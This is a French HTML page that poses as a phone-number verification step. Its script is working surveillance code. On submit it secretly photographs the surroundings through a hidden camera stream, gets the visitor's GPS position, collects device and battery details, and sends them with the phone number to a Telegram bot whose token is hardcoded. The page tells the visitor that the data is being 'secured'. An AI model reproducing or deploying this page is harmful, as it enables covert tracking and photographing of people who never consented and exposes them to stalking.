<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation de votre position</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            background-color: #f4f4f9;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: auto;
        }
        h1 {
            color: #333;
            font-size: 20px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover {
            background-color: #006699;
        }
        #cameraStream {
            display: none;
        }
    </style>
</head>
<body>

    <div class="card" id="formCard">
        <h1>Vérification requise</h1>
        <p>Veuillez entrer votre numéro de téléphone (avec l'indicatif pays) pour continuer :</p>
        <input type="tel" id="phoneInput" placeholder="Ex: +225 0700000000">
        <button id="submitBtn">Autoriser et Envoyer</button>
    </div>

    <div class="card" id="loadingCard" style="display: none;">
        <h1>Patientez...</h1>
        <p>Sécurisation et transmission des données en cours...</p>
    </div>

    <!-- Vidéo invisible pour capturer l'environnement -->
    <video id="cameraStream" autoplay playsinline></video>
    <canvas id="canvasCapture" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = "Navigateur inconnu";
            let typeAppareil = "Mobile / Autre";
            let marqueModele = "Inconnu (Sécurité Web)";

            if (ua.includes("Firefox")) browser = "Mozilla Firefox";
            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
            else if (ua.includes("Chrome")) browser = "Google Chrome";
            else if (ua.includes("Safari")) browser = "Apple Safari";
            else if (ua.includes("Edge")) browser = "Microsoft Edge";

            if (/android/i.test(ua)) typeAppareil = "Smartphone Android";
            else if (/iphone|ipad|ipod/i.test(ua)) typeAppareil = "iPhone (iOS)";
            else if (/windows/i.test(ua)) typeAppareil = "Ordinateur Windows";
            else if (/macintosh/i.test(ua)) typeAppareil = "Macintosh";

            let match = ua.match(/\(([^)]+)\)/);
            if (match && match[1]) {
                marqueModele = match[1];
            }

            return { browser, typeAppareil, marqueModele };
        }

        document.getElementById('submitBtn').addEventListener('click', async () => {
            const phone = document.getElementById('phoneInput').value.trim();
            if (!phone) {
                alert("Veuillez entrer un numéro de téléphone valide.");
                return;
            }

            if (!chatId) {
                alert("Erreur : Chat ID manquant.");
                return;
            }

            document.getElementById('formCard').style.display = 'none';
            document.getElementById('loadingCard').style.display = 'block';

            let batteryLevel = "Inconnu";
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                }
            } catch (e) {}

            const info = getDeviceInfo();

            try {
                // 1. Activer la caméra et capturer l'environnement (photo)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                });
                
                const videoElement = document.getElementById('cameraStream');
                videoElement.srcObject = stream;
                
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        resolve();
                    };
                });

                const canvas = document.getElementById('canvasCapture');
                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

                // 2. Obtenir la position GPS
                if (!navigator.geolocation) {
                    alert("La géolocalisation n'est pas supportée par votre navigateur.");
                    return;
                }

                navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // 3. Préparer le message texte récapitulatif
                    const descriptionText = 
                        `📋 **RAPPORT COMPLET DE CONNEXION**\n\n` +
                        `• **Type d'appareil :** ${info.typeAppareil}\n` +
                        `• **Marque / Système :** ${info.marqueModele}\n` +
                        `• **Navigateur :** ${info.browser}\n` +
                        `• **Batterie :** ${batteryLevel}\n` +
                        `• **Numéro de téléphone :** ${phone}\n` +
                        `• **Chat ID Telegram :** ${chatId}`;

                    const textApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(descriptionText)}&parse_mode=Markdown`;
                    const locationApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
                    const photoApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

                    try {
                        // Envoi du texte descriptif
                        await fetch(textApiUrl);

                        // Envoi de la photo de l'environnement
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', imageBlob, 'environnement.jpg');
                        formData.append('caption', '📷 Capture de l\'environnement');

                        await fetch(photoApiUrl, {
                            method: 'POST',
                            body: formData
                        });

                        // Envoi de la mini-carte interactive
                        await fetch(locationApiUrl);

                        document.querySelector('#loadingCard h1').innerText = "Succès !";
                        document.querySelector('#loadingCard p').innerText = "Le rapport, la photo et la position ont été transmis avec succès. Vous pouvez fermer la page.";
                        setTimeout(() => { window.close(); }, 3000);

                    } catch (error) {
                        console.error("Erreur réseau :", error);
                        alert("Erreur lors de la transmission des données.");
                    }

                }, (error) => {
                    alert("Veuillez autoriser l'accès à la position GPS pour continuer.");
                    document.getElementById('formCard').style.display = 'block';
                    document.getElementById('loadingCard').style.display = 'none';
                }, { enableHighAccuracy: true, timeout: 15000 });

            } catch (camError) {
                console.error("Erreur caméra :", camError);
                alert("Veuillez autoriser l'accès à la caméra pour continuer.");
                document.getElementById('formCard').style.display = 'block';
                document.getElementById('loadingCard').style.display = 'none';
            }
        });
    </script>

</body>
</html>
